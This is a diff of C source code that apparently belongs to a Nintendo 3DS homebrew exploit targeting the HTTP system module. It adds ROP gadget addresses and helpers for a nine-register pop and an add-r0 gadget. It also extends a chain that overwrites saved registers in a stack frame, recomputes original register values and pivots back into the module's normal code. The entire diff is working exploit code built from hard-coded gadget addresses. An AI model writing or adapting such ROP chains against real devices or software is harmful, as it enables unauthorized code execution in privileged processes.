@@ -27,6 +27,10 @@ u32 ROP_BLXR3_ADDSP12_POPPC = 0x00119438;//"blx r3" "add sp, sp, #12" "pop {pc}"
 
 u32 ROP_STRR7_R5x48_POPR4R5R6R7R8PC = 0x00102430;//Write r7 to r5+0x48. "pop {r4, r5, r6, r7, r8, pc}"
 
+u32 ROP_POP_R4R5R6R7R8R9SLFPIPPC = 0x00102e10;//"pop {r4, r5, r6, r7, r8, r9, sl, fp, ip, pc}"
+
+u32 ROP_ADDR0IP = 0x0010bc2c;//r0+= ip, bx-lr.
+
 void displaymessage_waitbutton()
 {
 	printf("\nPress the A button to continue.\n");
@@ -141,6 +145,15 @@ void ropgen_popr4r5r6r7r8pc(u32 **ropchain, u32 *http_ropvaddr, u32 r4, u32 r5, 
 	ropgen_addword(ropchain, http_ropvaddr, r8);
 }
 
+void ropgen_popr4r5r6r7r8r9slfpippc(u32 **ropchain, u32 *http_ropvaddr, u32 *regs)
+{
+	u32 i;
+
+	ropgen_addword(ropchain, http_ropvaddr, ROP_POP_R4R5R6R7R8R9SLFPIPPC);
+
+	for(i=0; i<9; i++)ropgen_addword(ropchain, http_ropvaddr, regs[i]);
+}
+
 void ropgen_blxr3(u32 **ropchain, u32 *http_ropvaddr, u32 addr)
 {
 	ropgen_popr3(ropchain, http_ropvaddr, addr);
@@ -179,6 +192,17 @@ void ropgen_stackpivot(u32 **ropchain, u32 *http_ropvaddr, u32 addr)
 	ropgen_addword(ropchain, http_ropvaddr, addr - (*http_ropvaddr + 4));
 }
 
+void ropgen_add_r0ip(u32 **ropchain, u32 *http_ropvaddr, u32 addval)//Add the current value of r0 with addval.
+{
+	u32 regs[9] = {0};
+
+	regs[8] = addval;
+
+	ropgen_popr4r5r6r7r8r9slfpippc(ropchain, http_ropvaddr, regs);
+
+	ropgen_blxr3(ropchain, http_ropvaddr, ROP_ADDR0IP);
+}
+
 void init_hax_sharedmem(u32 *tmpbuf)
 {
 	u32 sharedmembase = 0x10006000;
@@ -193,6 +217,8 @@ void init_hax_sharedmem(u32 *tmpbuf)
 	u32 ret2http_vaddr = sharedmembase+0xf00;
 
 	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
+
+	u32 regs[9] = {0};
 
 	target_overwrite_addr = closecontext_stackframe;
 	target_overwrite_addr-= 0xc;//Subtract by this value to get the address of the saved r5 which will be popped.
@@ -237,9 +263,15 @@ void init_hax_sharedmem(u32 *tmpbuf)
 	//Likewise for r4.
 	ropgen_copyu32(&ropchain, &http_ropvaddr, closecontext_stackframe - 2*4, ret2http_vaddr + 0x4, 0x3);
 
+	ropgen_ldrr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0x10, 1);//Load the r7 value from above into r0.
+	ropgen_add_r0ip(&ropchain, &http_ropvaddr, 0x98);//r0 = original value of r6(original_r7+0x98).
+	ropgen_strr0r1(&ropchain, &http_ropvaddr, ret2http_vaddr + 0xc, 1);//Write the calculated value for the original r6, to the ret2http ROP.
+
 	ropgen_stackpivot(&ropchain, &http_ropvaddr, ret2http_vaddr);//Pivot to the return-to-http ROP.
 
-	ropgen_popr4r5r6r7r8pc(&ropchain_ret2http, &ret2http_vaddr, 0, 0, 0, 0, 0);//The register values here are overwritten by the above ROP. r8 doesn't matter here since it's not used before r8 gets popped from stack @ returning from the function which is jumped to below.
+	regs[7] = 0x0011c418;//Set fp to the original value.
+
+	ropgen_popr4r5r6r7r8r9slfpippc(&ropchain_ret2http, &ret2http_vaddr, regs);//The register values here are overwritten by the above ROP. r8 doesn't matter here since it's not used before r8 gets popped from stack @ returning from the function which is jumped to below. Likewise for r9+sl, they get popped from the stack when httpc_cmdhandler() returns.
 
 	//Return to executing the original sysmodule code.
 	ropgen_stackpivot(&ropchain_ret2http, &ret2http_vaddr, closecontext_stackframe - 4);
